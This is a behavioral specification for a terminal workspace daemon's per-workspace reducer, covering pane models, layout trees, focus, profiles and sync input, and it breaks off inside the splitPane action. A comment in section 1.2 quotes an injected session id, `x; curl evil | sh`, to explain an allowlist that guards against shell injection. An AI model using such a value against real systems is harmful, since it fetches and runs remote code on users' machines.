# Workspace Feature: Behavioral Specification

Implemented by the daemon's per-workspace reducers:
`packages/daemon/src/store/reducers/panes.ts` (pane creation, splitting, closing, parking,
reopen, content panes), `packages/daemon/src/store/reducers/layout.ts` (focus, layout,
zoom, search), `packages/daemon/src/store/reducers/web.ts` (the web sidecar),
`packages/daemon/src/store/reducers/agent.ts` with `packages/core/src/agent/machine.ts`
(agent status), `packages/daemon/src/store/reducers/workspaces.ts` (metadata, labels,
repo associations); the model types in `packages/core/src/layout/pane.ts`,
`packages/core/src/layout/types.ts`, `packages/core/src/codec/icon.ts` and
`packages/daemon/src/store/types.ts`; the profile env in
`packages/core/src/env/merged-env.ts`; and the sync-group surface of
`packages/daemon/src/pty/manager.ts`.

This document specifies the **per-workspace reducer**: the state a single workspace owns
and the exact behavior of every action it handles. Kelpi keeps one `WorkspaceState` per
workspace inside the daemon's single store (`packages/daemon/src/store/store.ts`),
addressed by the workspace's UUID. The reducers are pure functions
`(state, action) -> state'`; the effects described below (spawn a PTY, run `git`, drive a
web view, push a sync group to the input broadcaster) are async jobs run by the handlers
and services around the store, and they may dispatch follow-up actions.

Terminology used throughout:

- "visible panes": the `panes` collection, i.e. panes present in the layout tree.
- "parked panes": the `parkedPanes` collection, off-layout panes whose PTYs stay alive.
- "un-zoom restore" / `restoreZoomIfNeeded()`: a shared preamble used by many actions,
  defined in section 5.1.
- UUIDs are compared/stored as opaque identifiers; in JSON they are lowercase-hyphenated
  strings.

---

## 1. Data model

### 1.1 Enumerations

```ts
type PaneType = "shell" | "markdown" | "scratchpad" | "diff" | "web";

type PaneStatus = "idle" | "running" | "waitingForInput";

type AgentKind = "claude" | "codex";

type WorkspaceColor =
  | "red" | "orange" | "yellow" | "green" | "blue"
  | "purple" | "pink" | "gray" | "black" | "white";
// "black" and "white" render as adaptive monochromes in the UI (dark end vs light end
// of a neutral grey that flips with light/dark appearance) so they never vanish into
// the chrome. That is a rendering concern only; the stored value is the string.

type SplitDirection = "horizontal" | "vertical";
// horizontal = side by side (new pane to the right); vertical = stacked (new pane below).

type DropZone = "top" | "bottom" | "left" | "right";

type Direction = "left" | "right" | "up" | "down"; // spatial focus/move navigation

type PredefinedLayout =
  | "even-horizontal" | "even-vertical"
  | "main-horizontal" | "main-vertical" | "tiled";
// Cycle order is exactly this list order (index 0..4).
```

`GroupIcon` (used for the optional workspace avatar override):

```ts
type GroupIcon =                        // `IconRef` in packages/core/src/codec/icon.ts
  | { kind: "system"; name: string }      // SF Symbol id, e.g. "star.fill"; tinted
  | { kind: "emoji"; grapheme: string };  // single grapheme; renders untinted
// Storage encoding (DB TEXT column): "system:<name>" or "emoji:<grapheme>".
// Unknown prefix or empty payload parses to null (falls back to default rendering:
// first letter of the workspace name / tinted folder for groups).
```

### 1.2 AgentKind behavior

```ts
// Wire mapping for the `agent` field on lifecycle events:
// absent or unrecognized -> "claude" (backwards compat with pre-#101 CLIs).
// Case-insensitive: "Codex" -> "codex".
function agentKindFromWire(raw: string | undefined): AgentKind {
  const k = raw?.toLowerCase();
  return k === "codex" ? "codex" : "claude";
}

// Session-id safety allowlist. Session ids arrive over the local socket and are later
// TYPED INTO A SHELL (resume-on-restart / reopen). A hostile local sender could persist
// `x; curl evil | sh` otherwise. Only ASCII alphanumerics plus . _ -, length 1..128.
function isSafeSessionID(id: string): boolean {
  return id.length >= 1 && id.length <= 128 && /^[A-Za-z0-9._-]+$/.test(id);
}

// The shell command used to resume a session in a freshly spawned PTY.
// Returns null (resume silently skipped) when the id fails the allowlist.
function resumeCommand(kind: AgentKind, sessionID: string): string | null {
  if (!isSafeSessionID(sessionID)) return null;
  return kind === "claude"
    ? `claude --resume ${sessionID}`
    : `codex resume ${sessionID}`;
}
```

### 1.3 Pane

```ts
interface Pane {
  id: string;                       // UUID, immutable
  label: string | null;             // user/CLI-assigned name; used for --target lookup
  type: PaneType;                   // default "shell"
  title: string | null;             // live title (terminal OSC title, web tab title,
                                    // "diff: <scope>", file name for markdown)
  workingDirectory: string;         // default: user home directory
  gitBranch: string | null;         // last detected branch of workingDirectory
  status: PaneStatus;               // default "idle"
  filePath: string | null;          // markdown: the file; diff: optional scope path
  isEditing: boolean;               // markdown edit mode / scratchpad always true
  externalEditorCommand: string | null; // non-null while a markdown pane hosts $EDITOR
                                    // in a terminal surface. TRANSIENT (not persisted).
  scratchpadContent: string | null; // scratchpad text; persisted to DB, never to a file
  agentSessionID: string | null;    // last known agent session id (persisted)
  agentKind: AgentKind | null;      // last known agent CLI (persisted; null = never seen;
                                    // display fallback is "claude")
  agentProfileName: string | null;  // effective KELPI_PROFILE the agent session was
                                    // launched under, as reported by the session-start
                                    // hook (persisted; never cleared on load, like
                                    // agentKind). Null = unknown; a resume then uses the
                                    // workspace's current profile. Exists so a resume can
                                    // rebuild the session's environment, not for display.
  markdownFontSize: number;         // default 14; in-memory only (but captured in
                                    // closed-pane snapshots so reopen keeps it)
  parkedSourcePaneID: string | null; // set on panes created by `kelpi open --here`:
                                    // points at the parked source pane. TRANSIENT.
  agentStartedAt: EpochMilliseconds | null; // epoch MILLISECONDS (JS `Date.now()`,
                                    // packages/core/src/layout/pane.ts:43,78; the agent
                                    // machine stamps it with `now` in ms,
                                    // packages/core/src/agent/machine.ts:89). NOT the
                                    // Unix-seconds encoding of createdAt/lastActivityAt:
                                    // mixing the two silently renders a "0s" badge.
                                    // When the current run entered "running". Drives
                                    // the "claude · mm:ss" badge.
                                    // TRANSIENT (a restored running pane shows no timer
                                    // until the agent re-emits a start).
  backgroundTaskCount: number;      // default 0; Claude Code background units still in
                                    // flight after the last Stop. TRANSIENT.
  createdAt: EpochSeconds;          // Unix seconds (float), the persistence encoding
                                    // (packages/core/src/layout/pane.ts:35,81)
  lastActivityAt: EpochSeconds;     // Unix seconds (float); bumped on title/cwd changes
                                    // (packages/core/src/layout/pane.ts:82)
}

const DEFAULT_MARKDOWN_FONT_SIZE = 14;

// Derived:
const isUsingExternalEditor = (p: Pane) => p.externalEditorCommand !== null;
```

### 1.4 ClosedPaneSnapshot

Captured at close time so `reopenClosedPane` can rebuild the pane.

```ts
interface ClosedPaneSnapshot {
  workingDirectory: string;
  label: string | null;
  type: PaneType;
  filePath: string | null;
  scratchpadContent: string | null;
  agentSessionID: string | null;   // used ONLY to type the resume command; not restored
                                   // onto the reopened pane's state
  agentKind: AgentKind | null;     // picks `claude --resume` vs `codex resume`
  agentProfileName: string | null; // the profile the recorded session was launched
                                   // under; reopen spawns the resume PTY with it (7.9)
  markdownFontSize: number;        // default 14
  webState: WebPaneState | null;   // web panes only; null for private web panes
                                   // (private tabs are deliberately dropped at close)
}
```

Not captured: `title`, `gitBranch`, `status`, `isEditing` (recomputed: scratchpads reopen
in edit mode), `backgroundTaskCount`, timestamps.

### 1.5 RepoAssociation

```ts
interface RepoAssociation {
  id: string;            // UUID
  repoID: string;        // UUID into the app-level repo registry
  worktreePath: string;
  branchName: string | null;
  isAutoDetected: boolean; // default false
}
```

### 1.6 PaneLayout (recursive tree)

The layout is a binary tree. Full algorithms live in the pane-layout subsystem doc, but
the workspace reducer's behavior depends on these exact semantics, so they are restated
here as a contract:

```ts
type PaneLayout =
  | { kind: "leaf"; paneID: string }
  | { kind: "split"; direction: SplitDirection; ratio: number; // first child's share
      first: PaneLayout; second: PaneLayout }
  | { kind: "empty" };
```

Operations the workspace reducer uses:

- `allPaneIDs(layout)`: DFS pre-order, `first` before `second`. This ordering defines
  focus-next/previous cycling and the "current order" fed into predefined layouts.
- `replacing(layout, paneID, replacement)`: replaces the leaf with that id by the given
  subtree; no-op if the id is not present.
- `removing(layout, paneID)`: the leaf becomes `empty`; a split with an empty child
  collapses to the surviving child (the surviving child keeps its own internal ratios;
  the removed split's ratio disappears). Removing the last leaf yields `empty`.
- `splitting(layout, paneID, direction, newPaneID)`: replaces `leaf(paneID)` with
  `split(direction, ratio: 0.5, first: leaf(paneID), second: leaf(newPaneID))`.
  The existing pane is always `first`, the new pane always `second` (right/bottom).
- `swappingLeaves(id1, id2)`: exchanges the two leaf ids; tree structure, directions and
  ratios are untouched. No-op when `id1 === id2` or an id is absent.
- `movingPane(paneID, targetID, zone)`:
  - no-op when `paneID === targetID`;
  - remove `paneID` (tree collapses), then replace `leaf(targetID)` with a new
    `split(zone.splitDirection, ratio: 0.5, ...)` where the moved pane is `first` for
    `left`/`top` zones and `second` for `right`/`bottom` zones.
  - `zone.splitDirection`: left/right -> horizontal, top/bottom -> vertical.
- `updatingSplitRatio(splitPath, ratio)`: see 1.7. Ratio clamps to `[0.1, 0.9]`.
- `ratio(atPath)`: read the stored first-child ratio at a split path; null if the path
  does not land on a split.
- `enclosingSplitPath(paneID)`: the path of the split whose DIRECT child is
  `leaf(paneID)`, plus whether the pane is the `first` child and the split's direction.
  Null if the pane is the sole root leaf or absent. (Backs `kelpi pane resize`: a pane's
  requested share maps to `ratio` when it is first, `1 - ratio` when second.)
- `nextPaneID(after)` / `previousPaneID(before)`: index in `allPaneIDs` +/- 1 with
  wraparound; null when the id is absent or there is only one pane.
- `neighborPaneID(of, inDirection)`: geometric neighbor. Computes every leaf's frame in
  a canonical 10000x10000 bounds (frames account for a 2px divider between siblings; the
  first child of a split gets `available * ratio` where
  `available = total - dividerThickness`). A candidate qualifies in direction `left` if
  `candidate.maxX <= source.minX + tolerance` (tolerance = dividerThickness + 1 = 3),
  and symmetrically for the other directions. Among qualifying candidates, pick minimal
  `distance = edgeGap + |midOrthogonal delta|`; ties break toward the top-left origin
  (smaller midY for left/right, smaller midX for up/down). Null when none qualify.

**Split-path encoding**: a split node is addressed by a string starting with `"d"`
(the root split), then one `"L"` or `"R"` per level: `L` descends into `first`, `R` into
`second`. Examples: `"d"` = root split; `"dL"` = root's first child (itself a split);
`"dRL"` = root's second child's first child. This is the same id the UI's divider drag
uses, and the same string `kelpi pane resize` reports as `split_path`.

**Predefined layouts** (`buildLayout(paneIDs)`; empty list -> `empty`, one id ->
`leaf`):

- `even-horizontal` / `even-vertical`: right-leaning comb. For N panes the first gets
  `ratio = 1/N` of the current level, the remainder recursively even-splits: pane i's
  final share is 1/N for all i. Directions all horizontal (columns) or all vertical
  (rows).
- `main-horizontal`: `split(vertical, ratio 0.6, first: leaf(main), second:
  evenSplit(horizontal, rest))`. Main pane on top at 60%, the rest in equal columns
  below.
- `main-vertical`: `split(horizontal, ratio 0.6, first: leaf(main), second:
  evenSplit(vertical, rest))`. Main pane on the left at 60%, the rest in equal rows on
  the right.
- `tiled`: recursive midpoint split alternating direction, starting horizontal:
  `mid = floor(N/2)`, `ratio = mid / N`, first half and second half recurse with the
  flipped direction.

The **first id** in the list passed to `buildLayout` is the "main" pane.

### 1.7 updatingSplitRatio semantics

```
updatingSplitRatio(layout, splitPath, newRatio):
  nav = splitPath without the leading "d"
  clamped = min(max(newRatio, 0.1), 0.9)
  walk the tree following nav (L -> first, R -> second):
    - if the current node is a leaf/empty at any point: return layout unchanged
    - when nav is exhausted at a split node: replace its ratio with `clamped`
      (children untouched)
```

The ratio stored is always the FIRST child's share of the available space. The clamp to
`[0.1, 0.9]` is enforced here (single choke point); the GUI divider drag, the
`updateSplitRatio` action, and `kelpi pane resize` all funnel through it.

### 1.8 WebPaneState (sidecar for `.web` panes)

Kept in a dictionary keyed by pane id, NOT on the Pane struct, so non-web code paths
never touch it. The reducer sidecar (`WebPaneState` in `packages/daemon/src/store/types.ts`)
holds ONLY the persisted parts: `tabs`, `activeTabID`, `isPrivate` (the tab list survives
restart), EXCEPT that a private pane persists only `isPrivate`: its tabs are withheld by
`persistPane` in `packages/daemon/src/store/snapshot.ts`, so it restores blank (an empty
tab list, seeded by `restoreWebPanes`) but still private, mirroring the close-time
snapshot rule in 1.4. The transient runtime state (console ring buffer, inspector
arm/nonce/result queue, batch-annotate session, last batch target) lives outside the
store in the daemon's web-pane service (`packages/daemon/src/webpane/service.ts`,
`ring.ts`, `console.ts`, `inspect.ts`, `batch.ts`) and is specified in web-pane.md; the
records below describe that service's per-pane runtime state, and the console,
element-inspector and batch-annotate entries under 7.6 describe its contract, not
reducer actions.

```ts
interface WebTab {
  id: string;      // UUID
  url: string;
  title: string;   // default ""
}
// Display label fallback chain: title -> URL host -> raw url -> "New Tab".

interface ConsoleLine {
  tabID: string;             // tab active when the line fired
  level: "log" | "debug" | "info" | "warn" | "error";
  message: string;           // pre-joined argument string
  url: string;
  lineNumber: number | null;
  columnNumber: number | null;
  capturedAt: string;        // ISO timestamp
}

interface InspectResult {
  tabID: string;
  selector: string; xpath: string; tag: string; elementID: string;
  outerHTML: string;
  attributes: Record<string, string>;
  rect: { x: number; y: number; width: number; height: number };
  text: string; contextHTML: string; url: string;
  capturedAt: string;
  comment: string;           // "" unless stamped by batch-annotate
}

interface BatchInspectItem { id: string; result: InspectResult; comment: string }

interface BatchInspectState {
  items: BatchInspectItem[];
  focusedItemID: string | null;  // bidirectional list<->page focus sync
  panelVisible: boolean;         // default true
}

interface WebPaneState {                   // the reducer sidecar: persisted parts only
  tabs: WebTab[];
  activeTabID: string | null;
  isPrivate: boolean;
}

interface WebPaneRuntime {                 // the web-pane service's transient record,
                                           // keyed by pane id; never in the store
  consoleBuffer: RingBuffer<ConsoleLine>;  // capacity 1000; oldest dropped when full,
                                           // drops counted in droppedSinceLastDrain
  inspectorArmed: boolean;                 // single-shot element picker armed
  pendingInspectSendTo: string | null;     // destination pane id for --send-to
  pendingInspectNonce: string | null;      // anti-spoof nonce checked on delivery
  inspectResultQueue: InspectResult[];     // cap 32, oldest dropped
  batchInspect: BatchInspectState | null;
  lastBatchTarget:                          // session-only memory of the last batch
    | { kind: "local" }                     // destination (not serialized)
    | { kind: "pane"; paneID: string }
    | null;
}

// Resolved active tab: the tab matching activeTabID, else tabs[0], else null.
// (activeTabID can be momentarily stale, e.g. right after a close.)
```

### 1.9 Workspace state

```ts
interface WorkspaceState {
  id: string;                        // UUID, immutable
  name: string;
  slug: string;                      // filesystem-safe, derived from name (see 3.1)
  color: WorkspaceColor;
  icon: GroupIcon | null;            // null -> first letter of name as avatar
  profileName: string | null;        // workspace profile (env-var set) assignment;
                                     // null == the built-in "default" baseline
  panes: Pane[];                     // ordered identified collection (append order);
                                     // lookup by id must be O(1)-ish
  layout: PaneLayout;
  focusedPaneID: string | null;
  focusHistory: string[];            // TRANSIENT; most-recent last; max 8; dedup
  repoAssociations: RepoAssociation[];
  recentlyClosedPanes: ClosedPaneSnapshot[]; // TRANSIENT; max 10; oldest dropped
  parkedPanes: Pane[];               // TRANSIENT; off-layout, PTYs alive
  webPanes: Record<string, WebPaneState>; // keyed by pane id (tabs part persisted)
  zoomedPaneID: string | null;       // TRANSIENT
  savedLayout: PaneLayout | null;    // TRANSIENT; pre-zoom layout
  searchingPaneID: string | null;    // TRANSIENT; pane with the find bar open
  searchNeedle: string;              // TRANSIENT; default ""
  searchTotal: number | null;        // TRANSIENT; match count
  searchSelected: number | null;     // TRANSIENT; 1-based selected match index
  currentLayoutIndex: number | null; // TRANSIENT; index into the predefined-layout
                                     // cycle, null = layout has been hand-modified
  createdAt: string;
  lastAccessedAt: string;
  labels: string[];                  // ordered, case-sensitively deduped tags
  isSyncInputActive: boolean;        // TRANSIENT; default false
  syncInputExcluded: Set<string>;    // TRANSIENT; default empty
}
```

**Persisted fields** (the restore constructor's exact parameter list): `id`, `name`,
`slug`, `color`, `icon`, `panes`, `layout`, `focusedPaneID`, `repoAssociations`,
`createdAt`, `lastAccessedAt`, `labels`, `webPanes` (tab list/active/private),
`profileName`. Everything else initializes to its default on restore.

`layout` is written as `savedLayout ?? layout` (`persistWorkspace` in
`packages/daemon/src/store/snapshot.ts`): a workspace saved while zoomed persists its
pre-zoom tree, never the zoomed single leaf, so restore always comes back un-zoomed with
every visible pane reachable (`zoomedPaneID` and `savedLayout` themselves stay transient
and reset to null).

Within `Pane`, the transient fields (`PANE_TRANSIENT_FIELDS` in
`packages/core/src/layout/pane.ts`) are `title`, `gitBranch`, `isEditing`,
`externalEditorCommand`, `markdownFontSize`, `parkedSourcePaneID`, `agentStartedAt`,
`backgroundTaskCount`: `restorePane` sets `title` and `gitBranch` to null (the branch
reconciler in 7.11 re-resolves them) and derives `isEditing = (type === "scratchpad")`.
`status` is written to the DB and restored verbatim, then the boot load step
(`applyLoadReset` in `packages/daemon/src/store/snapshot.ts`) forces any non-idle status
back to `idle` after capturing resume tuples, since a status describes a live PTY.
`agentSessionID`, `agentKind` and `agentProfileName` persist; the same load step clears
`agentSessionID` after capturing the resume tuples (see app-state-core.md), while
`agentKind` and `agentProfileName` are deliberately NOT cleared (they are last-known
values the tuples already captured).

### 1.10 Computed properties

```ts
// Panes that must mirror each other's keystrokes RIGHT NOW.
function syncedPaneIDs(s: WorkspaceState): Set<string> {
  if (!s.isSyncInputActive) return new Set();
  const candidates = s.panes
    .filter(p => p.type === "shell" && !s.syncInputExcluded.has(p.id))
    .map(p => p.id);
  // Fewer than two participants -> empty set (mirroring to nothing is pointless,
  // and a lone terminal must never "sync" to itself).
  return candidates.length >= 2 ? new Set(candidates) : new Set();
}
// Non-shell panes are excluded EVEN when they host a terminal surface (a markdown pane
// in $EDITOR mode hosts vim in a PTY; mirroring agent-prompt keystrokes into that
// editor would be a footgun).

function focusedPane(s: WorkspaceState): Pane | null {
  return s.focusedPaneID ? findVisible(s, s.focusedPaneID) : null;
}

// Count of in-progress agents: panes (visible AND parked) whose status != "idle"
// ("running" or "waitingForInput" both count). Drives the running-agents guard on
// workspace deletion (CLI --force gate, GUI "Delete anyway?" dialog) and the
// app-level active-agent summary.
function activeAgentCount(s: WorkspaceState): number {
  return [...s.panes, ...s.parkedPanes].filter(p => p.status !== "idle").length;
}
```

---

## 2. Construction

### 2.1 New workspace

```
newWorkspace(id = newUUID(), name, color = "blue", createdAt = now):
  slug = makeSlug(name, id)
  lastAccessedAt = createdAt
  paneID = newUUID()
  panes = [ defaultPane(paneID) ]      // shell pane, cwd = home dir, status idle
  layout = leaf(paneID)
  focusedPaneID = paneID
  (all other fields take their defaults from 1.9)
```

A brand-new workspace always has exactly one shell pane.

The `create-workspace` action (`packages/daemon/src/store/types.ts`, reduced in
`packages/daemon/src/store/reducers/workspaces.ts`) carries the pre-minted workspace and
pane ids plus optional `workingDirectory`, `color`, `profileName`, `groupID`, `labels`,
`placement` and `repoAssociations`. The first pane's cwd is `workingDirectory` when it is
non-empty, else the home directory; `profileName` goes through `normalizedAssignment`
(3.4); `labels` and `repoAssociations` default to empty. Group membership and sidebar
placement are app-state-core.md's domain.

Color choice for an appended workspace (`nextRandomColor` in
`packages/daemon/src/store/derived.ts`, applied by the handler; the reducer itself
defaults to `"blue"` when the action carries no color): pick a uniformly random
`WorkspaceColor` EXCLUDING the color of the current last workspace in the list, so
neighbors in the sidebar are visually distinct; fall back to `"blue"` if the filter
somehow empties the pool.

### 2.2 Restore from persistence

The restore constructor takes the persisted fields verbatim (section 1.9) and does NOT
create a default pane. A persisted workspace can legitimately restore with zero panes
and an `empty` layout, or with `focusedPaneID = null`.

---

## 3. Pure helpers

### 3.1 makeSlug(name, id)

```
base = name.toLowerCase()
         .replace(/[^a-z0-9]+/g, "-")   // runs collapse to one hyphen
         .replace(/^-+|-+$/g, "")       // trim hyphens
suffix = first 8 chars of the UUID string, lowercased
return base === "" ? suffix : `${base}-${suffix}`
```

The suffix guarantees uniqueness across same-named workspaces. Recomputed on rename.

### 3.2 sanitizedGitName(name) -> string | null

Sanitizes a user-entered worktree/branch name into something safe as BOTH a path
component and a git ref. Unlike `makeSlug` it preserves case, slashes (for
`feature/foo`), dots, underscores, hyphens; an already-valid name is a fixed point.

```
s = name.replace(/[^A-Za-z0-9\/._-]+/g, "-")  // spaces & git-hostile chars -> "-"
s = s.replace(/-{2,}/g, "-")
s = s.replace(/\/{2,}/g, "/")
s = s.replace(/\.{2,}/g, ".")
s = trim leading/trailing characters from the set { -  /  .  _  space }
return s === "" ? null : s
```

Best-effort: it does not enforce every `git check-ref-format` rule (e.g. a mid-path
component starting with `.`); callers must still surface git's own rejection errors.

### 3.3 normalizeLabel(raw)

```
t = raw.trim()             // whitespace and newlines
return t.length <= 64 ? t : t.slice(0, 64)
```

An empty result means "ignore this label". Max length 64.

### 3.4 Profile assignment normalization

```
normalizedAssignment(raw: string | null): string | null
  t = raw?.trim()                    // spaces/tabs only (not newlines) in the original
  if (!t || t === "" || t === "default") return null
  return t
```

`null` IS the "default" profile: the built-in baseline that always exists. At PTY spawn
time the effective profile name is `profileName ?? "default"`, and the resolved env is
the profile's parsed vars from `~/.config/kelpi/config` (or the file named by
`KELPID_CONFIG_PATH`; `resolveConfigPath` in `packages/daemon/src/boot/config.ts`) plus a
canonical `KELPI_PROFILE=<name>` marker merged last (so a config line spoofing
KELPI_PROFILE loses; `resolveProfileEnv` in `packages/core/src/env/merged-env.ts`).
Profile lines that define `KELPI_PANE_ID`, `KELPI_SOCKET` or `PATH` are silently dropped
(`RESERVED_ENV_KEYS`). A named profile with no config definitions resolves to just the
marker (logged as a warning by `spawnEnvVars` in
`packages/daemon/src/handlers/pane/support.ts`; the virtual `default` profile skips the
warning).

### 3.5 Focus bookkeeping

```
setFocus(state, newID: string | null):
  cur = state.focusedPaneID
  if (cur !== null && cur !== newID):
    remove all occurrences of cur from state.focusHistory
    push cur onto the end
    if (state.focusHistory.length > 8) drop entries from the FRONT until length == 8
  state.focusedPaneID = newID
```

Used for EVERY focus change EXCEPT pane close (a closing pane is destroyed, not "left",
and must not land in its own history; close paths assign `focusedPaneID` directly).

```
popFocusFromHistory(state, excluding: string | null): string | null
  if (excluding) remove all occurrences of excluding from focusHistory
  while (focusHistory not empty):
    candidate = focusHistory.pop()          // most-recent first
    if (candidate is a VISIBLE pane id) return candidate
    // dead / parked entries are silently discarded
  return null
```

### 3.6 Pane lookup and mutation across lanes

```
paneAnywhere(state, id)  = visible pane with id, else parked pane with id, else null
mutatePane(state, id, f) = apply f to the pane wherever it lives; no-op if absent
```

Surface/agent lifecycle events target panes in EITHER lane (a parked pane's agent still
reports status). User commands (send/split/close/...) intentionally look only at the
visible lane; that filtering happens in the socket/App layer, not here.

Two reducer actions move a pane between the lanes directly (`parkPane` / `unparkPane` in
`packages/daemon/src/store/reducers/panes.ts`; no wire verb or GUI path dispatches them
today, only tests):

- `park-pane(paneID)`: guard a visible pane, else no-op. clearSearchIfTargets(paneID);
  restoreZoomIfNeeded(); remove the pane from `panes` and push it onto `parkedPanes`;
  `layout = removing(layout, paneID)`; `currentLayoutIndex = null`; scrub `paneID` from
  `focusHistory`; if it was focused, refocus via popFocusFromHistory, else the first id
  in layout order, else null. Its PTY stays alive.
- `unpark-pane(paneID, replacePaneID?)`: guard a parked pane, else no-op.
  restoreZoomIfNeeded(); move the pane back to `panes` with `parkedSourcePaneID = null`;
  `currentLayoutIndex = null`. If `replacePaneID` names a visible pane, replace that leaf
  with `leaf(paneID)`; otherwise split the focused pane (falling back to the first pane in
  layout order) horizontally with the unparked pane second; on an empty layout it becomes
  the root leaf. Then `setFocus(paneID)`.

### 3.7 syncWebPaneHeader(state, paneID)

```
ws = state.webPanes[paneID]; if none, return
newTitle = displayLabel(resolvedActiveTab(ws)) ?? "Web"
if (visible pane's title !== newTitle) mutatePane(paneID, p => p.title = newTitle)
```

Called after any change to `activeTabID` (open/close/select/cycle) so the pane header
updates immediately instead of waiting for the next observed title change from the
web view.

### 3.8 refreshSyncGroup(state) -> effect

Pushes the workspace's current `syncedPaneIDs` to the keystroke broadcaster:

```
effect: surfaceManager.setSyncGroup(workspaceID: state.id, paneIDs: syncedPaneIDs(state))
// setSyncGroup semantics: empty set REMOVES the workspace's entry entirely;
// non-empty replaces it wholesale.
```

Returned by any action that mutates `panes` or the sync fields (see 6 and 7.11).

---

## 4. The sync-input broadcast contract (external to the reducer)

The reducer owns the *membership*; the input layer owns the *mirroring*. The contract,
implemented by the PTY manager (`packages/daemon/src/pty/manager.ts`):

- Broadcaster state: `syncGroups: Map<workspaceID, Set<paneID>>`.
- `setSyncGroup(wsID, ids)`: empty -> delete entry; else replace.
- `isSyncing(paneID)`: true if the pane is in ANY group (drives the pane-header badge).
- `syncTargetIDs(sourcePaneID)`: union of all groups containing the source, minus the
  source itself. (In practice a pane is in at most one group since groups are keyed by
  workspace and panes belong to one workspace.)
- On input to a synced pane, `write(paneID, bytes)` writes the identical bytes to every
  target (best-effort; targets whose PTY has exited are skipped silently). Key events and
  text-insertion payloads (paste, dictation, drag-drop) arrive as bytes at the same entry
  point, so both are mirrored via the same target set.
- Mirroring never echoes back to the source and never crosses workspaces.

---

## 5. Shared action preambles

### 5.1 restoreZoomIfNeeded()

Many actions begin with:

```
if (state.savedLayout !== null):
  state.layout = state.savedLayout
  state.zoomedPaneID = null
  state.savedLayout = null
```

i.e. any structural operation first exits zoom by restoring the pre-zoom layout. Actions
that DO run this preamble: `splitPaneAtPath`, `splitPane`, `closePane`,
`openMarkdownFile` (reuse branch only, see caveat in 7.4), `openDiffPane` (both
branches), `openWebPane` (both branches), `createScratchpad`, `cycleLayout`,
`selectLayout`. Actions that deliberately do NOT: `createPane` (empty-workspace path),
`movePane`, `movePaneInDirection` (guards `zoomedPaneID == null` instead and no-ops),
`updateSplitRatio`, `toggleZoomPane` (it IS the zoom toggle).

### 5.2 clearSearchIfTargets(paneID)

```
if (state.searchingPaneID === paneID):
  state.searchingPaneID = null
  state.searchNeedle = ""
  state.searchTotal = null
  state.searchSelected = null
```

### 5.3 Surface spawn effect (shell panes)

Creating a terminal-backed pane produces an async effect:

```
env = resolveProfileEnv(state.profileName ?? "default")   // section 3.4
spawnSurface(paneID, workingDirectory, command?: string, env)
```

The env is composed at spawn time (`spawnPaneIfShell` / `spawnEnvVars` in
`packages/daemon/src/handlers/pane/support.ts`), which, when the spawn is held by the
pane-geometry gate (`packages/daemon/src/pty/spawn-gate.ts`), can be a couple of seconds
after the dispatch: the deferred spawn re-reads the workspace and its `profileName` as of
that moment rather than capturing them, and the profile definitions are re-read from the
config file per spawn (`createProfileReader` in `packages/daemon/src/boot/config.ts`). A
`workspace profile` change landing inside the gate window is therefore what the new pane
gets; live PTYs keep their birth env. Every spawn path threads env, including the boot
restore and the markdown `$EDITOR` spawn; if any path skips it, profiles get flaky.

---

## 6. currentLayoutIndex rules (predefined-layout cycling state)

`currentLayoutIndex` remembers which predefined layout the workspace is currently "on"
so `cycleLayout` advances rather than restarts. It is `null` whenever the layout has
been modified by hand. Exact rules:

- SET (to the layout's index 0..4) by: `cycleLayout`, `selectLayout`.
- RESET to `null` by every structural mutation: `splitPaneAtPath`, `splitPane`,
  `openMarkdownFile`, `openDiffPane`, `openWebPane`, `createScratchpad`, `closePane`
  (both unpark and normal branches), `reopenClosedPane`, `updateSplitRatio`, `movePane`,
  `movePaneInDirection`.
- NOT touched by: `createPane` (quirk: it replaces the whole layout but leaves the index
  alone; harmless because it is only reachable on empty workspaces where the index is
  already null), `toggleZoomPane` (zoom is temporary; un-zooming restores the saved
  layout, and the index survives so cycling continues from where it was), focus actions,
  all non-structural actions.
- `kelpi pane resize` goes through the same `updateSplitRatio` semantics and therefore
  also resets the index (documented behavior: replicates the GUI divider drag).

---

## 7. Actions

Actions are grouped by concern. "Guard ... else no-op" means the action returns with no
state change and no effect.

### 7.1 Workspace metadata

**rename(newName)**
- `name = newName` (no trimming, no length limit).
- `slug = makeSlug(newName, id)` (recomputed; the old slug is not kept).

**setColor(color)** - sets `color`.

**setProfile(raw: string | null)**
- `profileName = normalizedAssignment(raw)` (3.4). Single choke point for socket, CLI
  and UI entry paths. Affects only panes spawned afterwards.

**addLabel(raw)**
- `n = normalizeLabel(raw)`; empty -> no-op.
- Append to `labels` only if not already present (case-sensitive exact match).

**removeLabel(label)** - remove all exact matches from `labels`.

**setLabels(raw: string[])**
- Normalize each entry; drop empties; if nothing survives, no-op (the handler reports an
  error rather than silently wiping); dedupe keeping FIRST occurrence order; replace
  `labels` wholesale.

**clearLabels** - `labels = []` (the `clear` op of `workspace-labels`).

All four are ops of the one `workspace-labels` action
(`packages/daemon/src/store/reducers/workspaces.ts`). `setLabels` and `addLabel` also
back-fill a gray label preset for each newly introduced label (app-state-core.md §6.4)
unless the action carries `backfillPresets: false`; the CLI paths back-fill, the GUI
bulk-apply does not.

### 7.2 Pane creation: createPane / splitPane / splitPaneAtPath

**createPane(newPaneID?: string, label?: string, workingDirectory?: string)**

Purpose: lay out the FIRST pane of an empty workspace (CLI `kelpi pane create` into an
empty workspace). All parameters default to null for legacy callers.

```
id = newPaneID ?? newUUID()
resolvedDir = (workingDirectory is non-null AND non-empty) ? workingDirectory
              : defaultHomeDirectory
pane = shellPane(id, label, resolvedDir)
panes.push(pane)
layout = leaf(id)                    // UNCONDITIONAL REPLACEMENT of the whole layout
setFocus(id)
effect: spawn surface (5.3) for id at resolvedDir
```

WARNING / invariant: `createPane` blindly replaces the layout with a single leaf. It is
only correct when the workspace is empty (no visible panes). Dispatching it on a
populated workspace would orphan every existing pane from the layout (they remain in
`panes` but are unreachable). Callers (socket handler for `pane create`,
`packages/daemon/src/handlers/pane/create.ts`) must route populated workspaces to
`splitPane`/`splitPaneAtPath` instead; Kelpi preserves this caller contract rather than
adding a guard (flagged QUIRK in `packages/daemon/src/store/reducers/panes.ts`).

`newPaneID` threading (issue #117): the CLI mints the id, replies to the client with it
immediately, and passes it in so the created pane really has that id. The same
`newPaneID` parameter exists on `splitPane` and `splitPaneAtPath` for the same reason,
so `kelpi pane split` / `pane create` always return the REAL new pane id.

**splitPane(direction, sourcePaneID?: string, label?: string, newPaneID?: string)**

Splits an existing pane; the new pane inherits the source pane's working directory.

```
restoreZoomIfNeeded()
